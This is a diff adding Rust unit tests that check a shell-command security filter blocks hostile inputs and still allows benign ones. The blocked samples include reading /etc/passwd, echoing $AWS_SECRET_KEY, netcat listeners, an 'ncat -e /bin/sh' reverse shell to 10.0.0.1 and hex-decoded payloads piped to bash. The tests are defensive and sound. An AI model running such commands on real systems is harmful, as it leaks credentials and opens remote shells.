@@ -133,3 +133,70 @@ fn security_patterns_allow_safe() {
         assert!(!blocked, "Should allow: {}", cmd);
     }
 }
+
+#[test]
+fn security_patterns_block_input_redirection() {
+    let patterns = compile_security_patterns().unwrap();
+    let dangerous = vec![
+        "cat < /etc/passwd",
+        "sh < ~/malicious.sh",
+        "bash <  /tmp/exploit",
+    ];
+    for cmd in dangerous {
+        let blocked = patterns.iter().any(|p| p.is_match(cmd));
+        assert!(blocked, "Should block: {}", cmd);
+    }
+}
+
+#[test]
+fn security_patterns_block_bare_var_expansion() {
+    let patterns = compile_security_patterns().unwrap();
+    let dangerous = vec!["echo $HOME", "echo $AWS_SECRET_KEY", "cat $PATH"];
+    for cmd in dangerous {
+        let blocked = patterns.iter().any(|p| p.is_match(cmd));
+        assert!(blocked, "Should block: {}", cmd);
+    }
+}
+
+#[test]
+fn security_patterns_block_netcat_listeners() {
+    let patterns = compile_security_patterns().unwrap();
+    let dangerous = vec![
+        "nc -l 4444",
+        "ncat -e /bin/sh 10.0.0.1 4444",
+        "netcat -lp 8080",
+    ];
+    for cmd in dangerous {
+        let blocked = patterns.iter().any(|p| p.is_match(cmd));
+        assert!(blocked, "Should block: {}", cmd);
+    }
+}
+
+#[test]
+fn security_patterns_block_hex_decode_to_shell() {
+    let patterns = compile_security_patterns().unwrap();
+    let dangerous = vec![
+        "xxd -r payload.hex | bash",
+        "xxd -r -p encoded | sh",
+        "printf '\\x48\\x49' | bash",
+        "printf '\\x68\\x65\\x6c' | sh",
+    ];
+    for cmd in dangerous {
+        let blocked = patterns.iter().any(|p| p.is_match(cmd));
+        assert!(blocked, "Should block: {}", cmd);
+    }
+}
+
+#[test]
+fn security_patterns_allow_safe_variants_of_new_patterns() {
+    let patterns = compile_security_patterns().unwrap();
+    let safe = vec![
+        "cat < relative_file.txt", // relative path redirect is fine
+        "printf '%s' hello",       // printf without hex escapes
+        "xxd file.bin",            // xxd without piping to shell
+    ];
+    for cmd in safe {
+        let blocked = patterns.iter().any(|p| p.is_match(cmd));
+        assert!(!blocked, "Should allow: {}", cmd);
+    }
+}
